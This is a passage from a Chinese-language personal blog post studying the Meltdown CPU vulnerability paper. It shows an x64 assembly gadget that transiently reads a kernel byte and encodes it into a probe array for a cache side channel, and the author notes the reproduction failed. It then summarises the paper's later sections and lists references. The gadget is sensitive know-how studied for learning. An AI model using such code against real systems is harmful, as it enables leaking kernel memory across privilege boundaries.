<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">.code</span><br><span class="line"></span><br><span class="line">OutOfOrderExecution PROC</span><br><span class="line">	mov   r8,  qword ptr [r8]	;读取null指针</span><br><span class="line">	movzx rax, byte ptr [rcx]	;读取内核一个字节，放到rax上</span><br><span class="line">	shl   rax, 12				;左移0xC，相当于获取到再探针数组上的偏移</span><br><span class="line">	mov   al,  byte ptr [rdx + rax]	;让探针数组缓存</span><br><span class="line">	ret</span><br><span class="line">OutOfOrderExecution ENDP</span><br><span class="line"></span><br><span class="line">end</span><br></pre></td></tr></table></figure>
<p>这里可以尝试不同的汇编组合，<strong>虽然最后我复现失败了</strong>，如果可行的话测试结果如下[2]：</p>
<p><img src="https://img-1300594400.cos.ap-shanghai.myqcloud.com/uploadsuploadsimage-20250930162203429.png" alt="image-20250930162203429" /></p>
<h1 id="后续章节"><a class="markdownIt-Anchor" href="#后续章节"></a> 后续章节</h1>
<p>主要讨论了meltdown的性能、arm和AMD处理器上的差异、缓解措施例如KAISER和结论。</p>
<p>附录中展示了如何在实战环境中利用Meltdown</p>
<h1 id="引用"><a class="markdownIt-Anchor" href="#引用"></a> 引用</h1>
<p>[1] M. Lipp等, 《Meltdown: reading kernel memory from user space》, <em>Commun. ACM</em>, 卷 63, 期 6, 页 46～56, 5月 2020, doi: <a target="_blank" rel="noopener" href="https://doi.org/10.1145/3357033">10.1145/3357033</a>.</p>
<p>[1] <a target="_blank" rel="noopener" href="https://www.bilibili.com/video/BV1qV4y1T7Gz">合集·关于编写 x64 Windows 10 驱动以了解虚拟内存这件事</a> 杜龙实验室 <a target="_blank" rel="noopener" href="https://www.bilibili.com/video/BV1qV4y1T7Gz">https://www.bilibili.com/video/BV1qV4y1T7Gz</a></p>
<p>[2] <a target="_blank" rel="noopener" href="https://github.com/dulong-lab/video-virtual-memory-materials">video-virtual-memory-materials</a> dulong-lab <a target="_blank" rel="noopener" href="https://github.com/dulong-lab/video-virtual-memory-materials">https://github.com/dulong-lab/video-virtual-memory-materials</a></p>
</div></article><div class="pagination"><a class="pagination__link pagination__prev" href="/2098/12/31/develop_handbook/">prev_post</a><a class="pagination__link pagination__next" href="/2025/08/16/talk-about-game-cheats/">next_post</a></div></main><footer class="footer metadata"><p class="footer__text">© 2025 Joe1sn</p><p class="footer__text">Powered by <a class="footer__text__link" href="https://hexo.io/" target="_blank">Hexo</a> &amp; <a class="footer__text__link" href="https://pages.github.com/" target="_blank">Github Page</a></p></footer></div></body></html>